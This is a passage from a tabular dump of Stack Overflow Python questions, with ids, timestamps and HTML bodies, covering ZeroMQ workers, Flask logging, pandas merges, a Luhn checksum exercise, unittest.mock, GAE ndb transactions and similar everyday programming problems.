<p>That will be very helpful to me... thanks!! </p>
"
40076887,308827.0,2016-10-17 00:13:27+00:00,3,Convert python abbreviated month name to full name,"<p>How can I convert an abbreviated month anme e.g. <code>Apr</code> in python to the full name?</p>
"
39862022,1443118.0,2016-10-04 21:25:40+00:00,3,ZeroMQ: load balance many workers and one master,"<p>Suppose I have one master process that divides up data to be processed in parallel. Lets say there are 1000 chunks of data and 100 nodes on which to run the computations.  </p>

<p>Is there some way to do REQ/REP to keep all the workers busy? I've tried to use the load balancer pattern in the guide but with a single client, <code>sock.recv()</code> is going to block until it receives its response from the worker. </p>

<p>Here is the code, slightly modified from the zmq guide for a load balancer. Is starts up one client, 10 workers, and a load balancer/broker in the middle. How can I get all those workers working at the same time???</p>

<pre><code>from __future__ import print_function
from multiprocessing import Process
import zmq
import time
import uuid
import random

def client_task():
    """"""Basic request-reply client using REQ socket.""""""
    socket = zmq.Context().socket(zmq.REQ)
    socket.identity = str(uuid.uuid4())
    socket.connect(""ipc://frontend.ipc"")
    # Send request, get reply
    for i in range(100):
        print(""SENDING: "", i)
        socket.send('WORK')
        msg = socket.recv()
        print(msg)

def worker_task():
    """"""Worker task, using a REQ socket to do load-balancing.""""""
    socket = zmq.Context().socket(zmq.REQ)
    socket.identity = str(uuid.uuid4())
    socket.connect(""ipc://backend.ipc"")
    # Tell broker we're ready for work
    socket.send(b""READY"")
    while True:
        address, empty, request = socket.recv_multipart()
        time.sleep(random.randint(1, 4))
        socket.send_multipart([address, b"""", b""OK : "" + str(socket.identity)])


def broker():
    context = zmq.Context()
    frontend = context.socket(zmq.ROUTER)
    frontend.bind(""ipc://frontend.ipc"")
    backend = context.socket(zmq.ROUTER)
    backend.bind(""ipc://backend.ipc"")
    # Initialize main loop state
    workers = []
    poller = zmq.Poller()
    # Only poll for requests from backend until workers are available
    poller.register(backend, zmq.POLLIN)

    while True:
        sockets = dict(poller.poll())
        if backend in sockets:
            # Handle worker activity on the backend
            request = backend.recv_multipart()
            worker, empty, client = request[:3]
            if not workers:
                # Poll for clients now that a worker is available
                poller.register(frontend, zmq.POLLIN)
            workers.append(worker)
            if client != b""READY"" and len(request) &gt; 3:
                # If client reply, send rest back to frontend
                empty, reply = request[3:]
                frontend.send_multipart([client, b"""", reply])

        if frontend in sockets:
            # Get next client request, route to last-used worker
            client, empty, request = frontend.recv_multipart()
            worker = workers.pop(0)
            backend.send_multipart([worker, b"""", client, b"""", request])
            if not workers:
                # Don't poll clients if no workers are available
                poller.unregister(frontend)

    # Clean up
    backend.close()
    frontend.close()
    context.term()

def main():
    NUM_CLIENTS = 1
    NUM_WORKERS = 10
    # Start background tasks
    def start(task, *args):
        process = Process(target=task, args=args)
        process.start()
    start(broker)

    for i in range(NUM_CLIENTS):
        start(client_task)

    for i in range(NUM_WORKERS):
        start(worker_task)


    # Process(target=broker).start()




if __name__ == ""__main__"":
    main()
</code></pre>
"
39863718,4184113.0,2016-10-05 00:31:36+00:00,3,How can I log outside of main Flask module?,"<p>I have a Python Flask application, the entry file configures a logger on the app, like so:</p>

<pre><code>app = Flask(__name__)
handler = logging.StreamHandler(sys.stdout)
app.logger.addHandler(handler)
app.logger.setLevel(logging.DEBUG)
</code></pre>

<p>I then do a bunch of logging using </p>

<p><code>app.logger.debug(""Log Message"")</code></p>

<p>which works fine. However, I have a few API functions like:</p>

<pre><code>@app.route('/api/my-stuff', methods=['GET'])
def get_my_stuff():
    db_manager = get_manager()
    query = create_query(request.args)

    service = Service(db_manager, query)
    app.logger.debug(""Req: {}"".format(request.url))
</code></pre>

<p>What I would like to know is how can I do logging within that <code>Service</code> module/python class. Do I have to pass the app to it? That seems like a bad practice, but I don't know how to get a handle to the app.logger from outside of the main Flask file...</p>
"
40138031,1034747.0,2016-10-19 17:35:14+00:00,3,How to read realtime microphone audio volume in python and ffmpeg or similar,"<p>I'm trying to read, in <em>near-realtime</em>, the volume coming from the audio of a USB microphone in Python. </p>

<p>I have the pieces, but can't figure out how to put it together. </p>

<p>If I already have a .wav file, I can pretty simply read it using <strong>wavefile</strong>:</p>

<pre><code>from wavefile import WaveReader

with WaveReader(""/Users/rmartin/audio.wav"") as r:
    for data in r.read_iter(size=512):
        left_channel = data[0]
        volume = np.linalg.norm(left_channel)
        print volume
</code></pre>

<p>This works great, but I want to process the audio from the microphone in real-time, not from a file.</p>

<p>So my thought was to use something like ffmpeg to PIPE the real-time output into WaveReader, but my Byte knowledge is somewhat lacking. </p>

<pre><code>import subprocess
import numpy as np

command = [""/usr/local/bin/ffmpeg"",
            '-f', 'avfoundation',
            '-i', ':2',
            '-t', '5',
            '-ar', '11025',
            '-ac', '1',
            '-acodec','aac', '-']

pipe = subprocess.Popen(command, stdout=subprocess.PIPE, bufsize=10**8)
stdout_data = pipe.stdout.read()
audio_array = np.fromstring(stdout_data, dtype=""int16"")

print audio_array
</code></pre>

<p>That looks pretty, but it doesn't do much. It fails with a <strong>[NULL @ 0x7ff640016600] Unable to find a suitable output format for 'pipe:'</strong> error. </p>

<p>I assume this is a fairly simple thing to do given that I only need to check the audio for volume levels. </p>

<p>Anyone know how to accomplish this simply? FFMPEG isn't a requirement, but it does need to work on OSX &amp; Linux. </p>
"
40099817,4596596.0,2016-10-18 04:55:42+00:00,3,"What is the best way to ""force"" users to use a certain file extension with argparse?","<p>I have a script which users include the pathnames for the input and output files. </p>

<pre><code>import argparse

parser = argparse.ArgumentParser()
parser.add_argument(""i"", help = ""input path"")
parser.add_argument(""o"", help = ""output path"")
args = parser.parse_args()
file_input = args.input
file_output = args.output
</code></pre>

<p>Now, I want to make sure that users create an output file that is a text file, with extension <code>.txt</code>. </p>

<p>(1) I could possible through an error, telling users that they <em>must</em> use a txt extension. </p>

<p>(2) I could check whether a <code>.txt</code> extension has been used. If not, I would simply add it. </p>

<p>The first is relatively easy:</p>

<pre><code>import argparse

parser = argparse.ArgumentParser()
parser.add_argument(""i"", help = ""input path"")
parser.add_argument(""o"", help = ""output path"")
args = parser.parse_args()
file_input = args.input
file_output = args.output
if file_output.endswith(""txt"") != True:
    raise argparse.ArgumentTypeError('File must end in extension .txt!')
</code></pre>

<p>How would one accomplish the latter? </p>
"
39864096,6916973.0,2016-10-05 01:26:35+00:00,3,What is the most efficient way to compare 45 Million rows of Text File to about 200k rows text file and produce non matches from the smaller file?,"<p>I have a 45 million row txt file that contains hashes. What would be the most efficient way to compare the file to another file, and provide only items from the second file that are not in the large txt file? </p>

<p>Current working: </p>

<pre><code>comm -13 largefile.txt smallfile.txt &gt;&gt; newfile.txt 
</code></pre>

<p>This works pretty fast but I am looking to push this into python to run regardless of os? </p>

<p>Attempted with memory issues:</p>

<pre><code>tp = pd.read_csv(r'./large file.txt',encoding='iso-8859-1', iterator=True, chunksize=50000)
full = pd.concat(tp, ignore_index=True)`
</code></pre>

<p>This method taps me out in memory usage and generally faults for some reason. </p>

<p>Example:</p>

<pre><code>&lt;large file.txt&gt;
hashes
fffca07998354fc790f0f99a1bbfb241
fffca07998354fc790f0f99a1bbfb242
fffca07998354fc790f0f99a1bbfb243
fffca07998354fc790f0f99a1bbfb244
fffca07998354fc790f0f99a1bbfb245
fffca07998354fc790f0f99a1bbfb246


&lt;smaller file.txt&gt;
hashes
fffca07998354fc790f0f99a1bbfb245
fffca07998354fc790f0f99a1bbfb246
fffca07998354fc790f0f99a1bbfb247
fffca07998354fc790f0f99a1bbfb248
fffca07998354fc790f0f99a1bbfb249
fffca07998354fc790f0f99a1bbfb240
</code></pre>

<p>Expected Output</p>

<pre><code>&lt;new file.txt&gt;
hashes
fffca07998354fc790f0f99a1bbfb247
fffca07998354fc790f0f99a1bbfb248
fffca07998354fc790f0f99a1bbfb249
fffca07998354fc790f0f99a1bbfb240
</code></pre>
"
39938449,6942837.0,2016-10-08 23:31:25+00:00,3,how do you add values from a list separately if one variable has two possible outcomes,"<p>This assignment calls another function:</p>

<pre><code>def getPoints(n):
    n = (n-1) % 13 + 1
    if n == 1:
        return [1] + [11]
    if 2 &lt;= n &lt;= 10:
        return [n]
    if 11 &lt;= n &lt;= 13:
        return [10] 
</code></pre>

<p>So my assignment wants me to add the sum of all possible points from numbers from a list of 52 numbers. This is my code so far.</p>

<pre><code>def getPointTotal(aList):
    points = []
    for i in aList:
        points += getPoints(i)
        total = sum(points)   
    return aList, points, total
</code></pre>

<p>However the issue is that the integer 1 has two possible point values, 1 or 11. When I do the sum of the points it does everything correctly, but it adds 1 and 11 together whereas I need it to compute the sum if the integer is 1 and if the integer is 11.</p>

<p>So for example:</p>

<pre><code>&gt;&gt;&gt;getPointTotal([1,26, 12]) # 10-13 are worth 10 points( and every 13th number that equates to 10-13 using n % 13.
&gt;&gt;&gt;[21,31] # 21 if the value is 1, 31 if the value is 11.
</code></pre>

<p>Another example:</p>

<pre><code>&gt;&gt;&gt;getPointTotal([1,14]) # 14 is just 14 % 13 = 1 so, 1 and 1.
&gt;&gt;&gt;[2, 12, 22] # 1+1=2, 1+11=12, 11+11=22
</code></pre>

<p>My output is:</p>

<pre><code>&gt;&gt;&gt;getPointTotal([1,14])
&gt;&gt;&gt;[24] #It's adding all of the numbers 1+1+11+11 = 24.
</code></pre>

<p>So my question is, is how do I make it add the value 1 separately from the value 11 and vice versa. So that way when I do have 1 it would add all the values and 1 or it would add all the values and 11.</p>
"
39867061,1479974.0,2016-10-05 06:42:42+00:00,3,Pandas: get first 10 elements of a series,"<p>I have a data frame with a column <code>tfidf_sorted</code> as follows:</p>

<pre><code>   tfidf_sorted

0  [(morrell, 45.9736796), (football, 25.58352014...
1  [(melatonin, 48.0010051405), (lewy, 27.5842077...
2  [(blues, 36.5746634797), (harpdog, 20.58669641...
3  [(lem, 35.1570832476), (rottensteiner, 30.8800...
4  [(genka, 51.4667410433), (legendaarne, 30.8800...
</code></pre>

<p>The <code>type(df.tfidf_sorted)</code> returns <code>pandas.core.series.Series</code>.</p>

<p>This column was created as follows:</p>

<pre><code>df['tfidf_sorted'] = df['tfidf'].apply(lambda y: sorted(y.items(), key=lambda x: x[1], reverse=True))
</code></pre>

<p>where <code>tfidf</code> is a dictionary.</p>

<p>How do I get the first 10 key-value pairs from <code>tfidf_sorted</code>?</p>
"
39671504,1205745.0,2016-09-24 01:04:21+00:00,3,assign output of help to a variable instead of stdout in python,"<p>I want to do something like this in the python interpreter.</p>

<pre><code>myhelp = help(myclass)
</code></pre>

<p>but the output goes to stdout.  Is it possible to assign it to a variable?</p>

<p>Thanks!</p>
"
39865185,6924202.0,2016-10-05 03:56:01+00:00,3,Applying modulo to all elements of a python list and getting some correct some incorrect elements,"<p>I am implementing a function that reduces all the elements of a list modulo 3. Here is what I have:</p>

<pre><code>def reduceMod3(l):
    for i in l:
        l[i] = l[i] % 3
    return l
</code></pre>

<p>when I call this function on L = [1,2,3,4,5,6,7,8,9] I get:</p>

<pre><code>L = [1, 2, 0, 4, 2, 6, 1, 8, 0]
</code></pre>

<p>Why is this? I am trying to figure it out but I'm in a rush. Thanks.</p>
"
40076806,854739.0,2016-10-17 00:00:59+00:00,3,Pandas merge not keeping 'on' column,"<p>I'm trying to merge two dataframes in <code>pandas</code> on a common column name (orderid).  The resulting dataframe (the merged dataframe) is dropping the orderid from the 2nd data frame.  Per the <a href=""http://pandas.pydata.org/pandas-docs/stable/generated/pandas.DataFrame.merge.html"" rel=""nofollow"" title=""documentation"">documentation</a>, the 'on' column should be kept unless you explicitly tell it not to.  </p>

<pre><code>import pandas as pd    
df = pd.DataFrame([[1,'a'], [2, 'b'], [3, 'c']], columns=['orderid', 'ordervalue'])
df['orderid'] = df['orderid'].astype(str)
df2 = pd.DataFrame([[1,200], [2, 300], [3, 400], [4,500]], columns=['orderid', 'ordervalue'])
df2['orderid'] = df2['orderid'].astype(str)
pd.merge(df, df2, on='orderid', how='outer', copy=True, suffixes=('_left', '_right'))
</code></pre>

<p>Which outputs this:</p>

<pre><code>|      |orderid | ordervalue_left | ordervalue_right |
|------|--------|-----------------|------------------|
| 0    | 1      | a               | 200              |
| 1    | 2      | b               | 300              |
| 2    | 3      | c               | 400              |
| 3    | 4      |                 | 500              |
</code></pre>

<p>What I am trying to create is this:</p>

<pre><code>|      | orderid_left | ordervalue_left | orderid_left | ordervalue_right |
|------|--------------|-----------------|--------------|------------------|
| 0    | 1            | a               | 1            | 200              |
| 1    | 2            | b               | 2            | 300              |
| 2    | 3            | c               | 3            | 400              |
| 3    | NaN          | NaN             | 4            | 500              |
</code></pre>

<p>How should I write this?</p>
"
40091894,5199440.0,2016-10-17 17:00:47+00:00,3,How to find a sentence containing a phrase in text using python re?,"<p>I have some text which is sentences, some of which are questions. I'm trying to create a regular expression which will extract only the questions which contain a specific phrase, namely 'NSF' :</p>

<pre><code>import re
s = ""This is a string. Is this a question? This isn't a question about NSF. Is this one about NSF? This one is a question about NSF but is it longer?""
</code></pre>

<p>Ideally, the re.findall would return:</p>

<pre><code>['Is this one about NSF?','This one is a question about NSF but is it longer?']
</code></pre>

<p>but my current best attempt is:</p>

<pre><code>re.findall('([\.\?].*?NSF.*\?)+?',s)
["". Is this a question? This isn't a question about NSF. Is this one about NSF? This one is a question about NSF but is it longer?""]
</code></pre>

<p>I know I need to do something with non-greedy-ness, but I'm not sure where I'm messing up.</p>
"
39892920,2736559.0,2016-10-06 09:55:59+00:00,3,How can I get around memory limitation in this script?,"<p>I'm trying to normalize my dataset which is <code>1.7 Gigabyte</code>. I have <code>14Gig of RAM</code> and I hit my limit very quickly. </p>

<p>This happens when computing the <code>mean/std</code> of the training data. The training data takes up the majority of the memory when loaded into <code>RAM(13.8Gig)</code>,thus the mean gets calculated, but when it reaches to the next line while calculating the <code>std</code>, it crashes.   </p>

<p>Follows the script:</p>

<pre><code>import caffe
import leveldb
import numpy as np
from caffe.proto import caffe_pb2
import cv2
import sys
import time

direct = 'examples/svhn/'
db_train = leveldb.LevelDB(direct+'svhn_train_leveldb')
db_test = leveldb.LevelDB(direct+'svhn_test_leveldb')
datum = caffe_pb2.Datum()

#using the whole dataset for training which is 604,388
size_train = 604388 #normal training set is 73257
size_test = 26032
data_train = np.zeros((size_train, 3, 32, 32))
label_train = np.zeros(size_train, dtype=int)

print 'Reading training data...'
i = -1
for key, value in db_train.RangeIter():
    i = i + 1
    if i % 1000 == 0:
        print i
    if i == size_train:
        break
    datum.ParseFromString(value)
    label = datum.label
    data = caffe.io.datum_to_array(datum)
    data_train[i] = data
    label_train[i] = label

print 'Computing statistics...'
print 'calculating mean...'
mean = np.mean(data_train, axis=(0,2,3))
print 'calculating std...'
std = np.std(data_train, axis=(0,2,3))

#np.savetxt('mean_svhn.txt', mean)
#np.savetxt('std_svhn.txt', std)

print 'Normalizing training'
for i in range(3):
        print i
        data_train[:, i, :, :] = data_train[:, i, :, :] - mean[i]
        data_train[:, i, :, :] = data_train[:, i, :, :]/std[i]


print 'Outputting training data'
leveldb_file = direct + 'svhn_train_leveldb_normalized'
batch_size = size_train

# create the leveldb file
db = leveldb.LevelDB(leveldb_file)
batch = leveldb.WriteBatch()
datum = caffe_pb2.Datum()

for i in range(size_train):
    if i % 1000 == 0:
        print i

    # save in datum
    datum = caffe.io.array_to_datum(data_train[i], label_train[i])
    keystr = '{:0&gt;5d}'.format(i)
    batch.Put( keystr, datum.SerializeToString() )

    # write batch
    if(i + 1) % batch_size == 0:
        db.Write(batch, sync=True)
        batch = leveldb.WriteBatch()
        print (i + 1)

# write last batch
if (i+1) % batch_size != 0:
    db.Write(batch, sync=True)
    print 'last batch'
    print (i + 1)
#explicitly freeing memory to avoid hitting the limit!
#del data_train
#del label_train

print 'Reading test data...'
data_test = np.zeros((size_test, 3, 32, 32))
label_test = np.zeros(size_test, dtype=int)
i = -1
for key, value in db_test.RangeIter():
    i = i + 1
    if i % 1000 == 0:
        print i
    if i ==size_test:
        break
    datum.ParseFromString(value)
    label = datum.label
    data = caffe.io.datum_to_array(datum)
    data_test[i] = data
    label_test[i] = label

print 'Normalizing test'
for i in range(3):
        print i
        data_test[:, i, :, :] = data_test[:, i, :, :] - mean[i]
        data_test[:, i, :, :] = data_test[:, i, :, :]/std[i]

#Zero Padding
#print 'Padding...'
#npad = ((0,0), (0,0), (4,4), (4,4))
#data_train = np.pad(data_train, pad_width=npad, mode='constant', constant_values=0)
#data_test = np.pad(data_test, pad_width=npad, mode='constant', constant_values=0)

print 'Outputting test data'
leveldb_file = direct + 'svhn_test_leveldb_normalized'
batch_size = size_test

# create the leveldb file
db = leveldb.LevelDB(leveldb_file)
batch = leveldb.WriteBatch()
datum = caffe_pb2.Datum()

for i in range(size_test):
    # save in datum
    datum = caffe.io.array_to_datum(data_test[i], label_test[i])
    keystr = '{:0&gt;5d}'.format(i)
    batch.Put( keystr, datum.SerializeToString() )

    # write batch
    if(i + 1) % batch_size == 0:
        db.Write(batch, sync=True)
        batch = leveldb.WriteBatch()
        print (i + 1)

# write last batch
if (i+1) % batch_size != 0:
    db.Write(batch, sync=True)
    print 'last batch'
    print (i + 1)
</code></pre>

<p>How can I make it consume less memory so that I can get to run the script?</p>
"
39895330,1874054.0,2016-10-06 11:55:10+00:00,3,2D Orthogonal projection of vector onto line with numpy yields wrong result,"<p>I have 350 document scores that, when I plot them, have this shape:</p>

<pre><code>docScores = [(0, 68.62998962), (1, 60.21374512), (2, 54.72480392), 
             (3, 50.71389389), (4, 49.39723969), ...,  
             (345, 28.3756237), (346, 28.37126923), 
             (347, 28.36397934), (348, 28.35762787), (349, 28.34219933)]
</code></pre>

<p>I posted the complete array <a href=""http://pastebin.com/JeW3kJf4"" rel=""nofollow"">here</a> on <code>pastebin</code> (it corresponds to the <code>dataPoints</code> list on the code below).</p>

<p><a href=""http://i.stack.imgur.com/BAeDE.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/BAeDE.png"" alt=""Score distribution""></a></p>

<p>Now, I originally needed to find the <code>elbow point</code> of this <code>L-shape</code> curve, which I found thanks to <a href=""http://stackoverflow.com/questions/2018178/finding-the-best-trade-off-point-on-a-curve"">this post</a>.</p>

<p>Now, on the following plot, the red vector <code>p</code> represents the elbow point. I would like to find the point <code>x=(?,?)</code> (the yellow star) on the vector <code>b</code> which corresponds to the orthogonal projection of <code>p</code> onto <code>b</code>. </p>

<p><a href=""http://i.stack.imgur.com/f1Kju.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/f1Kju.png"" alt=""enter image description here""></a></p>

<p>The red point on the plot is the one I obtain (which is obviously wrong).  I obtain it doing the following:</p>

<pre><code>b_hat = b / np.linalg.norm(b)    #unit vector of b
proj_p_onto_b = p.dot(b_hat)*b_hat
red_point = proj_p_onto_b + s
</code></pre>

<p>Now, if the projection of <code>p</code> onto <code>b</code> is defined by the its starting and ending point, namely <code>s</code> and <code>x</code> (the yellow star), it follows that <code>proj_p_onto_b = x - s</code>, therefore <code>x = proj_p_onto_b + s</code> ?</p>

<p>Did I make a mistake here ?</p>

<p><strong>EDIT :</strong> In answer to @cxw, here is the code for computing the elbow point :</p>

<pre><code>def findElbowPoint(self, rawDocScores):
    dataPoints = zip(range(0, len(rawDocScores)), rawDocScores)
    s = np.array(dataPoints[0])
    l = np.array(dataPoints[len(dataPoints)-1])
    b_vect = l-s
    b_hat = b_vect/np.linalg.norm(b_vect)
    distances = []
    for scoreVec in dataPoints[1:]:
        p = np.array(scoreVec) - s
        proj = p.dot(b_hat)*b_hat
        d = abs(np.linalg.norm(p - proj)) # orthgonal distance between b and the L-curve
        distances.append((scoreVec[0], scoreVec[1], proj, d))

    elbow_x = max(distances, key=itemgetter(3))[0]
    elbow_y = max(distances, key=itemgetter(3))[1]
    proj = max(distances, key=itemgetter(3))[2]
    max_distance = max(distances, key=itemgetter(3))[3]

    red_point = proj + s
</code></pre>

<p><strong>EDIT</strong> : Here is the code for the plot :</p>

<pre><code>&gt;&gt;&gt; l_curve_x_values = [x[0] for x in docScores]
&gt;&gt;&gt; l_curve_y_values = [x[1] for x in docScores]
&gt;&gt;&gt; b_line_x_values = [x[0] for x in docScores]
&gt;&gt;&gt; b_line_y_values = np.linspace(s[1], l[1], len(docScores))
&gt;&gt;&gt; p_line_x_values = l_curve_x_values[:elbow_x]
&gt;&gt;&gt; p_line_y_values = np.linspace(s[1], elbow_y, elbow_x)
&gt;&gt;&gt; plt.plot(l_curve_x_values, l_curve_y_values, b_line_x_values, b_line_y_values, p_line_x_values, p_line_y_values)
&gt;&gt;&gt; red_point = proj + s
&gt;&gt;&gt; plt.plot(red_point[0], red_point[1], 'ro')
&gt;&gt;&gt; plt.show()
</code></pre>
"
40075829,7028211.0,2016-10-16 21:46:30+00:00,3,Luhns Algorithm,"<p>Hey I am doing Luhn's algorithm for an assignment for school.</p>

<p>A few outputs are coming out the correct way; however, some are not. </p>

<p><code>0004222222222222</code> is giving me a total of <code>44</code>, </p>

<p>and</p>

<p><code>0378282246310005</code> is giving me a total of <code>48</code>, </p>

<p>for a few examples.</p>

<p>I know my code isn't the cleanest as I am a novice but if anyone can identify where I'm getting my error I'd really appreciate</p>

<p>Here is my code: </p>

<pre><code>cardNumber = input( ""What is your card number? "")
digit = len(cardNumber)
value = 0
total = 0
while ( len( cardNumber ) == 16 and digit &gt; 0):
    # HANDLE even digit positions
    if ( digit % 2 == 0 ):
        value = ( int( cardNumber[digit - 1]) * 2 )
        if( value &gt; 9 ):
            double = str( value )
            value = int( double[:1] ) + int( double[-1] )
            total = total + value
            value = 0
            digit = digit - 1
        else:
            total = total + value
            value = 0
            digit = digit - 1
    # HANDLE odd digit positions
    elif ( digit % 2 != 0):
        total = total + int( cardNumber[digit - 1] )
        digit = digit - 1
</code></pre>
"
39919699,2883245.0,2016-10-07 14:29:13+00:00,3,How can I use unittest.mock to remove side effects from code?,"<p>I have a function with several points of failure:</p>

<pre><code>def setup_foo(creds):
    """"""
    Creates a foo instance with which we can leverage the Foo virtualization
    platform.

    :param creds: A dictionary containing the authorization url, username,
                  password, and version associated with the Foo
                  cluster.
    :type creds:  dict
    """"""

    try:
        foo = Foo(version=creds['VERSION'],
                  username=creds['USERNAME'],
                  password=creds['PASSWORD'],
                  auth_url=creds['AUTH_URL'])

        foo.authenticate()
        return foo
    except (OSError, NotFound, ClientException) as e:
        raise UnreachableEndpoint(""Couldn't find auth_url {0}"".format(creds['AUTH_URL']))
    except Unauthorized as e:
        raise UnauthorizedUser(""Wrong username or password."")
    except UnsupportedVersion as e:
        raise Unsupported(""We only support Foo API with major version 2"")
</code></pre>

<p>and I'd like to test that all the relevant exceptions are caught (albeit not handled well currently).</p>

<p>I have an initial test case that passes:</p>

<pre><code>def test_setup_foo_failing_auth_url_endpoint_does_not_exist(self):
    dummy_creds = {
        'AUTH_URL' : 'http://bogus.example.com/v2.0',
        'USERNAME' : '', #intentionally blank.
        'PASSWORD' : '', #intentionally blank.
        'VERSION'  : 2 
    }
    with self.assertRaises(UnreachableEndpoint):
        foo = osu.setup_foo(dummy_creds)
</code></pre>

<p>but how can I make my test framework believe that the AUTH_URL is actually a valid/reachable URL?</p>

<p>I've created a mock class for <code>Foo</code>:</p>

<pre><code>class MockFoo(Foo):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
</code></pre>

<p>and my thought is mock the call to <code>setup_foo</code> and remove the side effect of raising an <code>UnreachableEndpoint</code> exception. I know how to <em>add</em> side-effects to a <code>Mock</code> with <code>unittest.mock</code>, but how can I remove them?</p>
"
39650735,6820619.0,2016-09-23 00:18:39+00:00,3,How to convert a string list to integer in python?,"<p>I have the following list of values:</p>

<pre><code>DATA =  [['5', '1'], ['5', '5'], ['3', '1'], ['6', '1'], ['4', '3']]
</code></pre>

<p>How can I convert it to :</p>

<pre><code>DATA = [[5, 1], [5, 5], [3, 1], [6, 1], [4, 3]]
</code></pre>

<p>Note : I have already tried the following but all are not working in <strong>Python 3</strong> :</p>

<pre><code>   1. DATA = [int(i) for i in DATA] 
   2. DATA = list(list(int(a) for a in b) for b in DA if a.isdigit())
   3. DATA = [map(int,x) for x in DATA]
</code></pre>

<p>Please help me with this. Thanks!!</p>
"
39919928,4495081.0,2016-10-07 14:40:01+00:00,3,Failed ndb transaction attempt not rolling back all changes?,"<p>I have some trouble understanding a sequence of events causing a bug in my appplication which can only be seen <strong>intermittently</strong> in the app deployed on GAE, and never when running with the local <code>devserver.py</code>.</p>

<p>All the related code snippets below (trimmed for MCV, hopefully I didn't lose anything significant) are executed during handling of <strong>the same</strong> task queue request.</p>

<p>The entry point:</p>

<pre><code>def job_completed_task(self, _):

    # running outside transaction as query is made
    if not self.all_context_jobs_completed(self.context.db_key, self):
        # this will transactionally enqueue another task
        self.trigger_job_mark_completed_transaction()
    else:
        # this is transactional
        self.context.jobs_completed(self)
</code></pre>

<p>The corresponding <code>self.context.jobs_completed(self)</code> is:</p>

<pre><code>@ndb.transactional(xg=True)
def jobs_completed(self, job):

    if self.status == QAStrings.status_done:
        logging.debug('%s jobs_completed %s NOP' % (self.lid, job.job_id))
        return

    # some logic computing step_completed here

    if step_completed:
        self.status = QAStrings.status_done  # includes self.db_data.put()

    # this will transactionally enqueue another task
    job.trigger_job_mark_completed_transaction()
</code></pre>

<p>The <code>self.status</code> setter, hacked to obtain a traceback for debugging this scenario:</p>

<pre><code>@status.setter
def status(self, new_status):
    assert ndb.in_transaction()

    status = getattr(self, self.attr_status)
    if status != new_status:
        traceback.print_stack()
        logging.info('%s status change %s -&gt; %s' % (self.name, status, new_status))
        setattr(self, self.attr_status, new_status)
</code></pre>

<p>The <code>job.trigger_job_mark_completed_transaction()</code> eventually enqueues a new task like this:</p>

<pre><code>    task = taskqueue.add(queue_name=self.task_queue_name, url=url, params=params,
                         transactional=ndb.in_transaction(), countdown=delay)
</code></pre>

<p>The GAE log for the occurence, split as it doesn't fit into a single screen:</p>

<p><a href=""http://i.stack.imgur.com/kN5ei.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/kN5ei.png"" alt=""enter image description here""></a></p>

<p><a href=""http://i.stack.imgur.com/ktDLu.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/ktDLu.png"" alt=""enter image description here""></a></p>

<p>My expectation from the <code>jobs_completed</code> transaction is to either see the <code>... jobs_completed ... NOP</code> debug message and no task enqueued or to at least see the <code>status change running -&gt; done</code> info message and a task enqueued by <code>job.trigger_job_mark_completed_transaction()</code>.</p>

<p>What I'm actually seeing is both messages and no task enqueued.</p>

<p>The logs appears to indicate the transaction is attempted twice:</p>

<ul>
<li><p>1st time it finds the status not <code>done</code>, so it executes the logic, sets the status to <code>done</code> (and displays the traceback and the info msg) and should transactionally enqueue the new task - but it doesn't</p></li>
<li><p>2nd time it finds the status <code>done</code> and just prints the debug message</p></li>
</ul>

<p>My question is - if the 1st transaction attempt fails shouldn't the status change be rolled back as well? What am I missing?</p>
"
39894896,1658072.0,2016-10-06 11:33:06+00:00,3,Set points outside plot to upper limit,"<p>Maybe this question exists already, but I could not find it. </p>

<p>I am making a scatter plot in Python. For illustrative purposes, I don't want to set my axes range such that all points are included - there may be some really high or really low values, and all I care about in those points is that they exist - that is, they need to be in the plot, but not on their actual value - rather, somewhere on the top of the canvas.</p>

<p>I know that in IDL there is a nice short syntax for this: in <code>plot(x,y&lt;value)</code> any value in y greater than <code>value</code> will simply be put at <code>y=value</code>.</p>

<p>I am looking for something similar in Python. Can somebody help me out?</p>
"
40099924,5553319.0,2016-10-18 05:04:23+00:00,3,"Drop ""faulty"" lines of pandas dataframe based on their type and value","<p>I have a dataset that includes a column of date and time values and another column containing some measured values (float). However, during some measurements, an error occured, resulting in some weird entries - example below (these include a repeated part of the datetime object which is interpreted as string, incomplete datetime object, a completely random string, a missing value or a value for the other column which is way out of range (measured values are mostly between 10 and 50, but sometimes I get a zero or a value like 100).</p>

<p>extract from the large dataset (loaded as pandas dataframe):</p>

<pre><code>                                      t                          baaa
0                      13/11/2014 23:43                          17.6
1                      13/11/2014 23:44                          17.7
2   2014-11-13 23:452014-11-13 23:45:00                          17.7
3                      13/11/2014 23:46                          17.7
4                      14/11/2014 00:34                            16
5                      14/11/2014 00:35                          15.9
6                                   :00                          17.7
7                      14/11/2014 01:25                          14.9
8                      14/11/2014 01:26                          14.9
9                                     0                            80
10                     14/11/2014 02:16                          14.3
11                     14/11/2014 02:17                          14.3
12                                  NaN  AA550112209500080009002855AA
13                     14/11/2014 03:09                            13
14                      009000B002B55AA                           NaN
15                     14/11/2014 02:19                          14.3
16                     14/11/2014 03:59                          12.6
17                     14/11/2014 04:00                          12.6
18                     14/11/2014 05:41                          11.7
19                     14/11/2014 05:42                          11.7
20                                    0                           140
21                     14/11/2014 04:53                          12.2
</code></pre>

<p>examples of all types of faulty entries are here.
How can I get rid of the faulty lines?
My idea was to do an if loop, setting the condition that the 't' column should be a datetime object and the 'baaa' columns should be a float > 0 and &lt; 60. If the condition is not fulfilled, I would replace the value with <code>np.nan</code> and eventually use the <code>dropna</code> function. </p>

<pre><code>df['t'] = pd.to_datetime(df['t'], format = '%d/%m/%Y %H:%M', errors='coerce')
df.iloc[:,1] = pd.to_numeric(df.iloc[:,1], errors='coerce')    
for line in df.iloc[:,1]:  
    if (line &lt; 60) &amp; (line &gt; 0):
       line = line
   else:
       line = np.nan
    # not assigning this new value! :( 

    df = df.dropna(subset = df.columns.values, how='any', inplace=True)
</code></pre>

<p>This seems to have solved most of the problems except the condition that the line needs to be lower than 60.
I must have a wrong syntax? Or what is wrong here?
Thanks!</p>
"
39888949,610569.0,2016-10-06 06:26:08+00:00,3,Fastest way to concatenate multiple files column wise - Python,"<p><strong>What is the fastest method to concatenate multiple files column wise (within Python)?</strong></p>

<p>Assume that I have two files with 1,000,000,000 lines and ~200 UTF8 characters per line.</p>

<p><strong>Method 1:</strong> Cheating with <code>paste</code></p>

